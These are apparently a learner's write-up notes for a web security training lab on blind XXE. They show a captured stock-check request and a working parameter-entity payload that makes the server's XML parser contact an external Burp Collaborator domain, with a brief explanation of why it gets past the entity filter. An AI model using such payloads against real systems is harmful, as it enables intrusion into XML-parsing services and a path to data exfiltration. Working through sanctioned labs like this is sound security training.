## Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Notes

- /product/stock
- /resources/js/stockCheck.js
- /resources/js/xmlStockCheckPayload.js
## Resume

1. Capture a `/product/stock`
2. Update the XML to try some OOB XXE payload using collborator 



## Solve 

Capture a `/product/stock` request : 

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Update the XML to try to hit burp collaborator :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://3dhv210jzj4yrwv1fywj6g0qshy8mzao.oastify.com"> %xxe; ]>
<stockCheck>
<productId>3</productId><storeId>1</storeId></stockCheck>
```

This works because parameter entities (`%`) are processed inside the DTD and are not blocked like regular entities. When the parser resolves `%xxe;`, it fetches the external URL, triggering a DNS/HTTP request to Burp Collaborator, confirming the XXE vulnerability.